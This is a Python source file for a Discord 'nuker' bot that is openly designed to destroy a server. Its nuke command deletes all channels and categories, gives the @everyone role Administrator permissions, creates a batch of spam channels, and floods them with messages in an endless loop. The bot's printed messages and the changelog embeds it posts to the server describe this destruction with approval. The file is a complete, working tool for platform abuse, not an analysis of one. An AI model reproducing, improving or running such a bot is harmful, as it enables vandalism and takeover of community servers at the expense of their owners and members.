import discord, json, random
from discord import Permissions
from discord.ext import commands
from datetime import datetime as local_time


# Reads config.json file
with open('config.json', 'r') as config:
    config = json.load(config)
    token = config['bot_token']
    prefix = config['bot_prefix']
    reason = config['reasoning']
    loop_times = int(config['loops'])
    server_nuked_name = config['server_nuked_name']
    nuked_channels = config['nuked_channel_names']
    messages = config['spam_messages']


# Init bot, changes default config, etc.
bot = commands.Bot(command_prefix = prefix, case_insensitive = True, description = 'Joee\'s discord nuker bot.', intents = discord.Intents.all())


# Tells user when bot is ready.
@bot.event
async def on_ready():
    print('''
       __                     _   __      __            
      / /___  ___  ___  _____/ | / /_  __/ /_____  _____
 __  / / __ \/ _ \/ _ \/ ___/  |/ / / / / //_/ _ \/ ___/
/ /_/ / /_/ /  __/  __(__  ) /|  / /_/ / ,< /  __/ /    
\____/\____/\___/\___/____/_/ |_/\__,_/_/|_|\___/_/     
    ''')
    print(f'{bot.user.name}#{bot.user.discriminator}, is logged in, and ready to cause chaos. (UID: {bot.user.id}, Prefix: {bot.command_prefix})')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="over some servers."))


# Nuke Command
@bot.command()
@commands.is_owner()
async def nuke(ctx):
    # Change discord bot presence.
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="a server get nuked."))


    # Deletes all channels and categories
    for item in ctx.guild.channels:
        await item.delete()


    # Creates Nuking, and Pings categories
    await ctx.guild.create_category('NUKING')
    await ctx.guild.create_category('PINGS')
    nuking_category = discord.utils.get(ctx.guild.channels, name='NUKING')
    pings_category = discord.utils.get(ctx.guild.channels, name='PINGS')


    # Create nuking changelog channel, and reasoning channel. Then gets the id's of said channels.
    perms_overwrite = {discord.utils.get(ctx.guild.roles, name='@everyone'): discord.PermissionOverwrite(view_channel = True, send_messages = False)}
    
    await ctx.message.guild.create_text_channel(name = 'nuking-changelog', category = nuking_category, overwrites = perms_overwrite)
    changelog_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-changelog')

    await ctx.message.guild.create_text_channel(name = 'nuking-reason', category = nuking_category, overwrites = perms_overwrite)
    reason_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-reason')

    await ctx.message.guild.create_text_channel('complaining')
    complaining_channel = discord.utils.get(ctx.guild.channels, name = 'complaining')

    embed = discord.Embed(title = 'All channels deleted.', description = f'Say good-bye to your old channels, the new #general is <#{complaining_channel.id}>', color = discord.Color.from_rgb(157, 51, 255))
    embed.timestamp = local_time.now()
    await changelog_channel.send(embed = embed)


    # Gives everyone admin permissions
    try:
        administrator_perms = Permissions()
        administrator_perms.update(administrator = True)
        await discord.utils.get(ctx.guild.roles, name='@everyone').edit(permissions = administrator_perms)

    except Exception:
        embed = discord.Embed(title = 'Error: Unable to give everyone `Administrator` permissions.', description = 'Sorry, something went wrong meaning I can\'t let you ruin the server yourself.', color = discord.Color.from_rgb(157, 51, 255))
        embed.timestamp = local_time.now()
        await changelog_channel.send(embed = embed)

    else:
        embed = discord.Embed(title = 'Everyone now has `Administrator` permissions', description = 'Enjoy ruining the server yourself!', color = discord.Color.from_rgb(157, 51, 255))
        embed.timestamp = local_time.now()
        await changelog_channel.send(embed = embed)


    # Creates ping channels
    for x in range(0, loop_times):
            for channel in nuked_channels:
                await ctx.guild.create_text_channel(name = f'{x}-{channel}', category = pings_category)
    
    while True:
        for channel in pings_category.channels:
            await channel.send(f'||`{random.randint(0, 9999)}`|| : **{random.choice(messages)}**')


# Stop Command
@bot.command()
@commands.is_owner()
async def stop(ctx):
    embed = discord.Embed(title = ':stop_sign: Nuking stopped. :stop_sign:', colour = discord.Color.from_rgb(157, 51, 255))
    embed.add_field(name = 'Joee\'s nuker has been stopped.', value = 'The connection to discord has been forcibly closed by a JoeeNuker staff.')
    await ctx.reply(embed = embed)
    await ctx.bot.close()
    print(f'{bot.user.name}#{bot.user.discriminator}, has been stopped in it\'s path of destruction. (Logged out.)')


# Init the bot, when the script is run.
bot.run(token)
